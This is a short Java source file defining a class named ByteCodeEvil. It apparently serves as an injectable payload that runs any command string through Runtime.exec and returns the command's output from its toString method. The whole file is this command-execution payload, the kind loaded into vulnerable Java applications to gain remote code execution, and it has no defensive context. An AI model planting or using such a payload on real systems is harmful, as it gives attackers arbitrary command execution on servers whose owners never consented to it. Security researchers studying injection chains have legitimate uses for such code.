package org.sec.core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ByteCodeEvil {
    String res;

    public ByteCodeEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        this.res = stringBuilder.toString();
    }

    public String toString() {
        return this.res;
    }
}